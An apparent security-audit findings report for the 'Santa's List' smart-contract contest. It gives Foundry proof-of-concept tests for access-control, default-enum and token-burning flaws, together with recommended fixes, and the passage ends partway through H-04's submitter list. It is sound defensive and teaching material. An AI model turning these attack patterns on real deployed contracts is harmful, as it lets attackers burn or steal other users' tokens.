# First Flight #5: Santa's List - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Anyone is able to call `checkList` function in SantasList contract and prevent any address from becoming `NICE` or `EXTRA_NICE` and collect present.](#H-01)
    - [H-02. All addresses are considered `NICE` by default and are able to claim a NFT through `collectPresent` function before any Santa check.](#H-02)
    - [H-03. SantasList::buyPresent burns token from presentReceiver instead of caller and also sends present to caller instead of presentReceiver.](#H-03)
    - [H-04. Any `NICE` or `EXTRA_NICE` user is able to call `collectPresent` function multiple times.](#H-04)
    - [H-05. Malicious Code Injection in solmate ERC20 Contract inside `transferFrom` function which is inherited in `SantaToken`](#H-05)
    - [H-06. Malicious Test potentially allowing data extraction from the user running it](#H-06)
- ## Medium Risk Findings
    - [M-01. Cost to buy NFT via SantasList::buyPresent is 2e18 SantaToken but it burns only 1e18 amount of SantaToken](#M-01)
- ## Low Risk Findings
    - [L-01. collectPresent() can be called at anytime after christmas](#L-01)
    - [L-02. Incompatibility of Solidity 0.8.22 with Arbitrum: Deployment Failures Due to Unsupported PUSH0 Opcode](#L-02)
    - [L-03. `buyPresent()` function mints to wrong address](#L-03)
    - [L-04. Christmas timezone + arbitrum boundry](#L-04)
    - [L-05. Oversized contract will make deployment fail](#L-05)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://codehawks.cyfrin.io/c/2023-11-Santas-List)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 6
   - Medium: 1
   - Low: 5


# High Risk Findings

## <a id='H-01'></a>H-01. Anyone is able to call `checkList` function in SantasList contract and prevent any address from becoming `NICE` or `EXTRA_NICE` and collect present.

_Submitted by [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [tadev](https://profiles.cyfrin.io/u/tadev), [jerseyjoewalcott](https://profiles.cyfrin.io/u/jerseyjoewalcott), [bobadj](https://profiles.cyfrin.io/u/bobadj), [0xMaximus](https://profiles.cyfrin.io/u/0xMaximus), [timenov](https://profiles.cyfrin.io/u/timenov), [nisedo](https://profiles.cyfrin.io/u/nisedo), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [kamuik16](https://profiles.cyfrin.io/u/kamuik16), [Mahmudsudo](https://profiles.cyfrin.io/u/Mahmudsudo), [0x6a70](https://profiles.cyfrin.io/u/0x6a70), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [prince6019](https://profiles.cyfrin.io/u/prince6019), [alexbabits](https://profiles.cyfrin.io/u/alexbabits), [skyhunter](https://profiles.cyfrin.io/u/skyhunter), [pacelli](https://profiles.cyfrin.io/u/pacelli), [innertia](https://profiles.cyfrin.io/u/innertia), [Ryan](https://profiles.cyfrin.io/u/Ryan), [gabr1sr](https://profiles.cyfrin.io/u/gabr1sr), [Mj0ln1r](https://profiles.cyfrin.io/u/Mj0ln1r), [leogold](https://profiles.cyfrin.io/u/leogold), [naman1729](https://profiles.cyfrin.io/u/naman1729), [Mikea](https://profiles.cyfrin.io/u/Mikea), [DeFiesta](https://profiles.cyfrin.io/u/DeFiesta), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [dougo](https://profiles.cyfrin.io/u/dougo), [hack0xield](https://profiles.cyfrin.io/u/hack0xield), [praise03](https://profiles.cyfrin.io/u/praise03), [zach030](https://profiles.cyfrin.io/u/zach030), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [Hussareth](https://profiles.cyfrin.io/u/Hussareth), [naruto](https://profiles.cyfrin.io/u/naruto), [touqeershah32](https://profiles.cyfrin.io/u/touqeershah32), [atoko](https://profiles.cyfrin.io/u/atoko), [amritko](https://profiles.cyfrin.io/u/amritko), [0xtheblackpanther](https://profiles.cyfrin.io/u/0xtheblackpanther), [0xakira](https://profiles.cyfrin.io/u/0xakira), [spacecowboy](https://profiles.cyfrin.io/u/spacecowboy), [Sovni](https://profiles.cyfrin.io/u/Sovni), [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss), [fcf](https://profiles.cyfrin.io/u/fcf), [rocknet](https://profiles.cyfrin.io/u/rocknet), [Gracious](https://profiles.cyfrin.io/u/Gracious), [darkart](https://profiles.cyfrin.io/u/darkart), [TrillionX](https://profiles.cyfrin.io/u/TrillionX), [Prabhas](https://profiles.cyfrin.io/u/Prabhas), [musashi](https://profiles.cyfrin.io/u/musashi), [0x141414](https://profiles.cyfrin.io/u/0x141414), [wallebach](https://profiles.cyfrin.io/u/wallebach), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [rapstyle](https://profiles.cyfrin.io/u/rapstyle), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [atlanticbase](https://profiles.cyfrin.io/u/atlanticbase), [theFirstElderFr](https://profiles.cyfrin.io/u/theFirstElderFr), [maziXYZ](https://profiles.cyfrin.io/u/maziXYZ), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [bhvrvt](https://profiles.cyfrin.io/u/bhvrvt), [dentonylifer](https://profiles.cyfrin.io/u/dentonylifer), [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien), [djanerch](https://profiles.cyfrin.io/u/djanerch), [awacs](https://profiles.cyfrin.io/u/awacs), [developerjordy](https://profiles.cyfrin.io/u/developerjordy), [dcheng](https://profiles.cyfrin.io/u/dcheng), [benbo](https://profiles.cyfrin.io/u/benbo), [pelz](https://profiles.cyfrin.io/u/pelz), [ararara](https://profiles.cyfrin.io/u/ararara), [0xeLSeR17](https://profiles.cyfrin.io/u/0xeLSeR17), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [asimaranov](https://profiles.cyfrin.io/u/asimaranov), [aethrouzz](https://profiles.cyfrin.io/u/aethrouzz), [aitor](https://profiles.cyfrin.io/u/aitor), [n4thedev01](https://profiles.cyfrin.io/u/n4thedev01), [teddy](https://profiles.cyfrin.io/u/teddy), [wasny](https://profiles.cyfrin.io/u/wasny), [Oozman](https://profiles.cyfrin.io/u/Oozman), [0xfuluz](https://profiles.cyfrin.io/u/0xfuluz), [CyrilFromEarth](https://profiles.cyfrin.io/u/CyrilFromEarth), [novodelta](https://profiles.cyfrin.io/u/novodelta), [luiscfaria](https://profiles.cyfrin.io/u/luiscfaria), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [Jaydhales](https://profiles.cyfrin.io/u/Jaydhales), [takarez](https://profiles.cyfrin.io/u/takarez), [davide](https://profiles.cyfrin.io/u/davide), [coffee](https://profiles.cyfrin.io/u/coffee), [0xManguebytes](https://profiles.cyfrin.io/u/0xManguebytes), [shawnsmlee](https://profiles.cyfrin.io/u/shawnsmlee), [bytecode](https://profiles.cyfrin.io/u/bytecode), [sobieski](https://profiles.cyfrin.io/u/sobieski), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [0xbjorn](https://profiles.cyfrin.io/u/0xbjorn), [modey](https://profiles.cyfrin.io/u/modey), [n0kto](https://profiles.cyfrin.io/u/n0kto), [forkforkdog](https://profiles.cyfrin.io/u/forkforkdog), [0xdark1337](https://profiles.cyfrin.io/u/0xdark1337), [adnpark](https://profiles.cyfrin.io/u/adnpark), [zanderbyte](https://profiles.cyfrin.io/u/zanderbyte), [icebear](https://profiles.cyfrin.io/u/icebear), [Osora9](https://profiles.cyfrin.io/u/Osora9), [passteque](https://profiles.cyfrin.io/u/passteque), [L9xd](https://codehawks.cyfrin.io/team/clpu083nl000hen22qbyixt7d), [tk3](https://profiles.cyfrin.io/u/tk3), [Y403L](https://profiles.cyfrin.io/u/Y403L), [mircha](https://profiles.cyfrin.io/u/mircha), [0x0noob](https://profiles.cyfrin.io/u/0x0noob), [denzi](https://profiles.cyfrin.io/u/denzi), [bube](https://profiles.cyfrin.io/u/bube), [kryptonomousB](https://profiles.cyfrin.io/u/kryptonomousB), [Martin7777](https://profiles.cyfrin.io/u/Martin7777), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01), [0xjarix](https://profiles.cyfrin.io/u/0xjarix), [TheCodingCanuck](https://profiles.cyfrin.io/u/TheCodingCanuck), [editdev](https://profiles.cyfrin.io/u/editdev), [t0x1c](https://profiles.cyfrin.io/u/t0x1c), [EchoSpr](https://profiles.cyfrin.io/u/EchoSpr), [mahivasisth](https://profiles.cyfrin.io/u/mahivasisth), [mgf15](https://profiles.cyfrin.io/u/mgf15), [Nocturnus](https://profiles.cyfrin.io/u/Nocturnus), [silverwind](https://profiles.cyfrin.io/u/silverwind), [dianivanov](https://profiles.cyfrin.io/u/dianivanov), [azmaeengh](https://profiles.cyfrin.io/u/azmaeengh), [0xlouistsai](https://profiles.cyfrin.io/u/0xlouistsai), [0x0bserver](https://profiles.cyfrin.io/u/0x0bserver), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [0xhashiman](https://profiles.cyfrin.io/u/0xhashiman), [kaiziron](https://profiles.cyfrin.io/u/kaiziron), [zhuying](https://profiles.cyfrin.io/u/zhuying). Selected submission by: [tadev](https://profiles.cyfrin.io/u/tadev)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L121

## Summary

With the current design of the protocol, anyone is able to call `checkList` function in SantasList contract, while documentation says only Santa should be able to call it. This can be considered as an access control vulnerability, because not only santa is allowed to make the first check.


## Vulnerability Details

An attacker could simply call the external `checkList` function, passing as parameter the address of someone else and the enum Status `NAUGHTY`(or         `NOT_CHECKED_TWICE`, which should actually be `UNKNOWN` given documentation). 
By doing that, Santa will not be able to execute `checkTwice` function correctly for `NICE` and `EXTRA_NICE` people. Indeed, if Santa first checked a user and assigned the status `NICE` or `EXTRA_NICE`,  anyone is able to call `checkList` function again, and by doing so modify the status. This could result in Santa unable to execute the second check. 
Moreover, any malicious actor could check the mempool and front run Santa just before calling `checkTwice` function to check users. This would result in a major denial of service issue.


## Impact

The impact of this vulnerability is HIGH as it results in a broken mechanism of the check list system. Any user could be declared `NAUGHTY` for the first check at any time, preventing present collecting by users although Santa considered the user as `NICE` or `EXTRA_NICE`.

Santa could still call `checkList` function again to reassigned the status to `NICE` or `EXTRA_NICE` before calling `checkTwice` function, but any malicious actor could front run the call to `checkTwice` function. In this scenario, it would be impossible for Santa to actually double check a `NICE` or `EXTRA_NICE` user.


## Proof of Concept

Just copy paste this test in SantasListTest contract : 
```
   function testDosAttack() external {
        vm.startPrank(makeAddr("attacker"));
        // any user can checList any address and assigned status to naughty
        // an attacker could front run Santa before the second check
        santasList.checkList(makeAddr("user"), SantasList.Status.NAUGHTY);
        vm.stopPrank();

        vm.startPrank(santa);
        vm.expectRevert();
        // Santa is unable to check twice the user
        santasList.checkTwice(makeAddr("user"), SantasList.Status.NICE);
        vm.stopPrank();
    }
```

## Tools Used

Foundry

## Recommendations

I suggest to add the `onlySanta` modifier to `checkList` function. This will ensure the first check can only be done by Santa, and prevent DOS attack on the contract. With this modifier, specification will be respected : 

"In this contract Only Santa to take the following actions:
  - checkList: A function that changes an address to a new Status of NICE, EXTRA_NICE, NAUGHTY, or UNKNOWN on the original s_theListCheckedOnce list."

The following code will resolve this access control issue, simply by adding `onlySanta` modifier:
```
    function checkList(address person, Status status) external onlySanta {
        s_theListCheckedOnce[person] = status;
        emit CheckedOnce(person, status);
    }
```
No malicious actor is now able to front run Santa before `checkTwice` function call.

The following tests shows that doing the first check for another user is impossible after adding `onlySanta` modifier:
```
    function testDosResolved() external {
        vm.startPrank(makeAddr("attacker"));
        // checklist function call will revert if a user tries to execute the first check for another user
        vm.expectRevert(SantasList.SantasList__NotSanta.selector);
        santasList.checkList(makeAddr("user"), SantasList.Status.NAUGHTY);
        vm.stopPrank();
    }
``` 
## <a id='H-02'></a>H-02. All addresses are considered `NICE` by default and are able to claim a NFT through `collectPresent` function before any Santa check.

_Submitted by [tadev](https://profiles.cyfrin.io/u/tadev), [ptsanev](https://profiles.cyfrin.io/u/ptsanev), [jerseyjoewalcott](https://profiles.cyfrin.io/u/jerseyjoewalcott), [nisedo](https://profiles.cyfrin.io/u/nisedo), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [pacelli](https://profiles.cyfrin.io/u/pacelli), [bobadj](https://profiles.cyfrin.io/u/bobadj), [0x6a70](https://profiles.cyfrin.io/u/0x6a70), [alexbabits](https://profiles.cyfrin.io/u/alexbabits), [skyhunter](https://profiles.cyfrin.io/u/skyhunter), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [timenov](https://profiles.cyfrin.io/u/timenov), [innertia](https://profiles.cyfrin.io/u/innertia), [Ryan](https://profiles.cyfrin.io/u/Ryan), [leogold](https://profiles.cyfrin.io/u/leogold), [gabr1sr](https://profiles.cyfrin.io/u/gabr1sr), [touthang](https://profiles.cyfrin.io/u/touthang), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [hack0xield](https://profiles.cyfrin.io/u/hack0xield), [arkan](https://profiles.cyfrin.io/u/arkan), [naruto](https://profiles.cyfrin.io/u/naruto), [Sovni](https://profiles.cyfrin.io/u/Sovni), [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [0x141414](https://profiles.cyfrin.io/u/0x141414), [spacecowboy](https://profiles.cyfrin.io/u/spacecowboy), [bbcrypt](https://profiles.cyfrin.io/u/bbcrypt), [awacs](https://profiles.cyfrin.io/u/awacs), [dcheng](https://profiles.cyfrin.io/u/dcheng), [0xeLSeR17](https://profiles.cyfrin.io/u/0xeLSeR17), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [ararara](https://profiles.cyfrin.io/u/ararara), [wasny](https://profiles.cyfrin.io/u/wasny), [TrillionX](https://profiles.cyfrin.io/u/TrillionX), [aitor](https://profiles.cyfrin.io/u/aitor), [naman1729](https://profiles.cyfrin.io/u/naman1729), [teddy](https://profiles.cyfrin.io/u/teddy), [asimaranov](https://profiles.cyfrin.io/u/asimaranov), [ryonen](https://profiles.cyfrin.io/u/ryonen), [davide](https://profiles.cyfrin.io/u/davide), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [Turetos](https://profiles.cyfrin.io/u/Turetos), [shawnsmlee](https://profiles.cyfrin.io/u/shawnsmlee), [sobieski](https://profiles.cyfrin.io/u/sobieski), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [forkforkdog](https://profiles.cyfrin.io/u/forkforkdog), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [adnpark](https://profiles.cyfrin.io/u/adnpark), [zanderbyte](https://profiles.cyfrin.io/u/zanderbyte), [MikeDougherty](https://profiles.cyfrin.io/u/MikeDougherty), [amritko](https://profiles.cyfrin.io/u/amritko), [mircha](https://profiles.cyfrin.io/u/mircha), [dianivanov](https://profiles.cyfrin.io/u/dianivanov), [t0x1c](https://profiles.cyfrin.io/u/t0x1c), [maziXYZ](https://profiles.cyfrin.io/u/maziXYZ), [0xlouistsai](https://profiles.cyfrin.io/u/0xlouistsai), [0x0bserver](https://profiles.cyfrin.io/u/0x0bserver). Selected submission by: [tadev](https://profiles.cyfrin.io/u/tadev)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L70

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L154

## Summary

`collectPresent` function is supposed to be called by users that are considered `NICE` or `EXTRA_NICE` by Santa. This means Santa is supposed to call `checkList` function to assigned a user to a status, and then call `checkTwice` function to execute a double check of the status.

Currently, the enum `Status` assigns its default value (0) to `NICE`. This means that both mappings `s_theListCheckedOnce` and `s_theListCheckedTwice` consider every existent address as `NICE`. In other words, all users are by default double checked as `NICE`, and therefore eligible to call `collectPresent` function.

## Vulnerability Details

The vulnerability arises due to the order of elements in the enum. If the first value is `NICE`, this means the enum value for each key in both mappings will be `NICE`, as it corresponds to `0` value.

## Impact

The impact of this vulnerability is HIGH as it results in a flawed mechanism of the present distribution. Any unchecked address is currently able to call `collectPresent` function and mint an NFT. This is because this contract considers by default every address with a `NICE` status (or 0 value).

## Proof of Concept

The following Foundry test will show that any user is able to call `collectPresent` function after `CHRISTMAS_2023_BLOCK_TIME` :
```
    function testCollectPresentIsFlawed() external {
        // prank an attacker's address
        vm.startPrank(makeAddr("attacker"));
        // set block.timestamp to CHRISTMAS_2023_BLOCK_TIME
        vm.warp(1_703_480_381);
        // collect present without any check from Santa
        santasList.collectPresent();
        vm.stopPrank();
    }
```

## Tools Used

Foundry

## Recommendations

I suggest to modify `Status` enum, and use `UNKNOWN` status as the first one. This way, all users will default to `UNKNOWN` status, preventing the successful call to `collectPresent` before any check form Santa:

```  
enum Status {
        UNKNOWN,
        NICE,
        EXTRA_NICE,
        NAUGHTY
    }
```

After modifying the enum, you can run the following test and see that `collectPresent` call will revert if Santa didn't check the address and assigned its status to `NICE` or `EXTRA_NICE` : 
```
    function testCollectPresentIsFlawed() external {
        // prank an attacker's address
        vm.startPrank(makeAddr("attacker"));
        // set block.timestamp to CHRISTMAS_2023_BLOCK_TIME
        vm.warp(1_703_480_381);
        // collect present without any check from Santa
        vm.expectRevert(SantasList.SantasList__NotNice.selector);
        santasList.collectPresent();
        vm.stopPrank();
    }
```
## <a id='H-03'></a>H-03. SantasList::buyPresent burns token from presentReceiver instead of caller and also sends present to caller instead of presentReceiver.

_Submitted by [tadev](https://profiles.cyfrin.io/u/tadev), [nisedo](https://profiles.cyfrin.io/u/nisedo), [jerseyjoewalcott](https://profiles.cyfrin.io/u/jerseyjoewalcott), [0xMaximus](https://profiles.cyfrin.io/u/0xMaximus), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [Mahmudsudo](https://profiles.cyfrin.io/u/Mahmudsudo), [pacelli](https://profiles.cyfrin.io/u/pacelli), [alexbabits](https://profiles.cyfrin.io/u/alexbabits), [bobadj](https://profiles.cyfrin.io/u/bobadj), [timenov](https://profiles.cyfrin.io/u/timenov), [Ryan](https://profiles.cyfrin.io/u/Ryan), [Mj0ln1r](https://profiles.cyfrin.io/u/Mj0ln1r), [Mikea](https://profiles.cyfrin.io/u/Mikea), [dougo](https://profiles.cyfrin.io/u/dougo), [hack0xield](https://profiles.cyfrin.io/u/hack0xield), [0x6a70](https://profiles.cyfrin.io/u/0x6a70), [naruto](https://profiles.cyfrin.io/u/naruto), [naman1729](https://profiles.cyfrin.io/u/naman1729), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss), [rocknet](https://profiles.cyfrin.io/u/rocknet), [Prabhas](https://profiles.cyfrin.io/u/Prabhas), [musashi](https://profiles.cyfrin.io/u/musashi), [wallebach](https://profiles.cyfrin.io/u/wallebach), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [0x141414](https://profiles.cyfrin.io/u/0x141414), [atlanticbase](https://profiles.cyfrin.io/u/atlanticbase), [theFirstElderFr](https://profiles.cyfrin.io/u/theFirstElderFr), [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien), [developerjordy](https://profiles.cyfrin.io/u/developerjordy), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [ararara](https://profiles.cyfrin.io/u/ararara), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [asimaranov](https://profiles.cyfrin.io/u/asimaranov), [dentonylifer](https://profiles.cyfrin.io/u/dentonylifer), [0xfuluz](https://profiles.cyfrin.io/u/0xfuluz), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [ryonen](https://profiles.cyfrin.io/u/ryonen), [aitor](https://profiles.cyfrin.io/u/aitor), [luiscfaria](https://profiles.cyfrin.io/u/luiscfaria), [pelz](https://profiles.cyfrin.io/u/pelz), [Jaydhales](https://profiles.cyfrin.io/u/Jaydhales), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [Turetos](https://profiles.cyfrin.io/u/Turetos), [coffee](https://profiles.cyfrin.io/u/coffee), [0xManguebytes](https://profiles.cyfrin.io/u/0xManguebytes), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [n4thedev01](https://profiles.cyfrin.io/u/n4thedev01), [forkforkdog](https://profiles.cyfrin.io/u/forkforkdog), [n0kto](https://profiles.cyfrin.io/u/n0kto), [icebear](https://profiles.cyfrin.io/u/icebear), [azmaeengh](https://profiles.cyfrin.io/u/azmaeengh), [adnpark](https://profiles.cyfrin.io/u/adnpark), [tk3](https://profiles.cyfrin.io/u/tk3), [novodelta](https://profiles.cyfrin.io/u/novodelta), [MikeDougherty](https://profiles.cyfrin.io/u/MikeDougherty), [leogold](https://profiles.cyfrin.io/u/leogold), [denzi](https://profiles.cyfrin.io/u/denzi), [rapstyle](https://profiles.cyfrin.io/u/rapstyle), [bube](https://profiles.cyfrin.io/u/bube), [Martin7777](https://profiles.cyfrin.io/u/Martin7777), [mircha](https://profiles.cyfrin.io/u/mircha), [Y403L](https://profiles.cyfrin.io/u/Y403L), [davide](https://profiles.cyfrin.io/u/davide), [EchoSpr](https://profiles.cyfrin.io/u/EchoSpr), [t0x1c](https://profiles.cyfrin.io/u/t0x1c), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01), [Nocturnus](https://profiles.cyfrin.io/u/Nocturnus), [0xlouistsai](https://profiles.cyfrin.io/u/0xlouistsai), [mgf15](https://profiles.cyfrin.io/u/mgf15), [dianivanov](https://profiles.cyfrin.io/u/dianivanov), [benbo](https://profiles.cyfrin.io/u/benbo), [kaiziron](https://profiles.cyfrin.io/u/kaiziron), [zhuying](https://profiles.cyfrin.io/u/zhuying), [0x0bserver](https://profiles.cyfrin.io/u/0x0bserver). Selected submission by: [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L172

## Summary
The `buyPresent` function sends the present to the `caller` of the function but burns token from `presentReceiver` but the correct method should be the opposite of it. 
Due to this implementation of the function, malicious caller can mint NFT by burning the balance of other users by passing any arbitrary address for the `presentReceiver` field and tokens will be deducted from the `presentReceiver` and NFT will be minted to the malicious caller.

Also, the NatSpec mentions that one has to approve `SantasList` contract to burn their tokens but it is not required and even without approving the funds can be burnt which means that the attacker can burn the balance of everyone and mint a large number of NFT for themselves.

`buyPresent` function should send the present (NFT) to the `presentReceiver` and should burn the SantaToken from the caller i.e. `msg.sender`.

## Vulnerability Details
The vulnerability lies inside the SantasList contract inside the `buyPresent` function starting from line 172.

The buyPresent function takes in `presentReceiver` as an argument and burns the balance from `presentReceiver` instead of the caller i.e. `msg.sender`, as a result of which an attacker can specify any address for the `presentReceiver` that has approved or not approved the SantasToken (it doesn't matter whether they have approved token or not) to be spent by the SantasList contract, and as they are the caller of the function, they will get the NFT while burning the SantasToken balance of the address specified in `presentReceiver`.

This vulnerability occurs due to wrong implementation of the buyPresent function instead of minting NFT to presentReceiver it is minted to caller as well as the tokens are burnt from presentReceiver instead of burning them from `msg.sender`.

Also, the NatSpec mentions that one has to approve `SantasList` contract to burn their tokens but it is not required and even without approving the funds can be burnt which means that the attacker can burn the balance of everyone and mint a large number of NFT for themselves.

```cpp
/* 
 * @notice Buy a present for someone else. This should only be callable by anyone with SantaTokens.
 * @dev You'll first need to approve the SantasList contract to spend your SantaTokens.
 */
function buyPresent(address presentReceiver) external {
@>  i_santaToken.burn(presentReceiver);
@>  _mintAndIncrement();
}
```

## PoC
Add the test in the file: `test/unit/SantasListTest.t.sol`

Run the test:
```cpp
forge test --mt test_AttackerCanMintNft_ByBurningTokensOfOtherUsers
```

```cpp
function test_AttackerCanMintNft_ByBurningTokensOfOtherUsers() public {
    // address of the attacker
    address attacker = makeAddr("attacker");

    vm.startPrank(santa);

    // Santa checks user once as EXTRA_NICE
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);

    // Santa checks user second time
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);

    vm.stopPrank();

    // christmas time 🌳🎁  HO-HO-HO
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME()); 

    // User collects their NFT and tokens for being EXTRA_NICE
    vm.prank(user);
    santasList.collectPresent();

    assertEq(santaToken.balanceOf(user), 1e18);

    uint256 attackerInitNftBalance = santasList.balanceOf(attacker);

    // attacker get themselves the present by passing presentReceiver as user and burns user's SantaToken
    vm.prank(attacker);
    santasList.buyPresent(user);

    // user balance is decremented
    assertEq(santaToken.balanceOf(user), 0);
    assertEq(santasList.balanceOf(attacker), attackerInitNftBalance + 1);
}
```

## Impact
- Due to the wrong implementation of function, an attacker can mint NFT by burning the SantaToken of other users by passing their address for the `presentReceiver` argument. The protocol assumes that user has to approve the SantasList in order to burn token on their behalf but it will be burnt even though they didn't approve it to `SantasList` contract, because directly `_burn` function is called directly by the `burn` function and both of them don't check for approval.
- Attacker can burn the balance of everyone and mint a large number of NFT for themselves. 

## Tools Used
Manual Review, Foundry Test

## Recommendations
- Burn the SantaToken from the caller i.e., `msg.sender`
- Mint NFT to the `presentReceiver`

```diff
+ function _mintAndIncrementToUser(address user) private {
+    _safeMint(user, s_tokenCounter++);
+ }

function buyPresent(address presentReceiver) external {
-   i_santaToken.burn(presentReceiver);
-   _mintAndIncrement();
+   i_santaToken.burn(msg.sender);
+   _mintAndIncrementToUser(presentReceiver);
}
```

By applying this recommendation, there is no need to worry about the approvals and the vulnerability - 'tokens can be burnt even though users don't approve' will have zero impact as the tokens are now burnt from the caller. Therefore, an attacker can't burn others token.
## <a id='H-04'></a>H-04. Any `NICE` or `EXTRA_NICE` user is able to call `collectPresent` function multiple times.

_Submitted by [jerseyjoewalcott](https://profiles.cyfrin.io/u/jerseyjoewalcott), [timenov](https://profiles.cyfrin.io/u/timenov), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [bobadj](https://profiles.cyfrin.io/u/bobadj), [alexbabits](https://profiles.cyfrin.io/u/alexbabits), [Ryan](https://profiles.cyfrin.io/u/Ryan), [naman1729](https://profiles.cyfrin.io/u/naman1729), [pacelli](https://profiles.cyfrin.io/u/pacelli), [Mikea](https://profiles.cyfrin.io/u/Mikea), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [0xeLSeR17](https://profiles.cyfrin.io/u/0xeLSeR17), [praise03](https://profiles.cyfrin.io/u/praise03), [zach030](https://profiles.cyfrin.io/u/zach030), [kamuik16](https://profiles.cyfrin.io/u/kamuik16), [XORs33r](https://profiles.cyfrin.io/u/XORs33r), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [Hussareth](https://profiles.cyfrin.io/u/Hussareth), [atoko](https://profiles.cyfrin.io/u/atoko), [darkart](https://profiles.cyfrin.io/u/darkart), [Sovni](https://profiles.cyfrin.io/u/Sovni), [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss), [rocknet](https://profiles.cyfrin.io/u/rocknet), [TrillionX](https://profiles.cyfrin.io/u/TrillionX), [wallebach](https://profiles.cyfrin.io/u/wallebach), [rapstyle](https://profiles.cyfrin.io/u/rapstyle), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [0x141414](https://profiles.cyfrin.io/u/0x141414), [atlanticbase](https://profiles.cyfrin.io/u/atlanticbase), [spacecowboy](https://profiles.cyfrin.io/u/spacecowboy), [dentonylifer](https://profiles.cyfrin.io/u/dentonylifer), [developerjordy](https://profiles.cyfrin.io/u/developerjordy), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [pelz](https://profiles.cyfrin.io/u/pelz), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [ararara](https://profiles.cyfrin.io/u/ararara), [MikeDougherty](https://profiles.cyfrin.io/u/MikeDougherty), [wasny](https://profiles.cyfrin.io/u/wasny), [aethrouzz](https://profiles.cyfrin.io/u/aethrouzz), [asimaranov](https://profiles.cyfrin.io/u/asimaranov), [aitor](https://profiles.cyfrin.io/u/aitor), [0xfuluz](https://profiles.cyfrin.io/u/0xfuluz), [tadev](https://profiles.cyfrin.io/u/tadev), [ryonen](https://profiles.cyfrin.io/u/ryonen), [Jaydhales](https://profiles.cyfrin.io/u/Jaydhales), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [luiscfaria](https://profiles.cyfrin.io/u/luiscfaria), [coffee](https://profiles.cyfrin.io/u/coffee), [0xManguebytes](https://profiles.cyfrin.io/u/0xManguebytes), [bytecode](https://profiles.cyfrin.io/u/bytecode), [sobieski](https://profiles.cyfrin.io/u/sobieski), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [0xbjorn](https://profiles.cyfrin.io/u/0xbjorn), [forkforkdog](https://profiles.cyfrin.io/u/forkforkdog), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [modey](https://profiles.cyfrin.io/u/modey), [n0kto](https://profiles.cyfrin.io/u/n0kto), [adnpark](https://profiles.cyfrin.io/u/adnpark), [passteque](https://profiles.cyfrin.io/u/passteque), [amritko](https://profiles.cyfrin.io/u/amritko), [novodelta](https://profiles.cyfrin.io/u/novodelta), [Martin7777](https://profiles.cyfrin.io/u/Martin7777), [leogold](https://profiles.cyfrin.io/u/leogold), [bube](https://profiles.cyfrin.io/u/bube), [mircha](https://profiles.cyfrin.io/u/mircha), [kryptonomousB](https://profiles.cyfrin.io/u/kryptonomousB), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01), 